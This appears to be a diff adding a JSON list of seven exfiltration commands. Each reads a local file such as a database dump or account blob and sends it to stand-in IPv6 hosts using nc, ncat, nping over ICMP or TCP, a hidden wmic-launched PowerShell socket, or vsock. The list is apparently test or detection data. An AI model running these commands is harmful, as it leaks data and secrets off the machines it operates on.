@@ -1,0 +1,9 @@
+[
+  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
+  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
+  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\""
+]
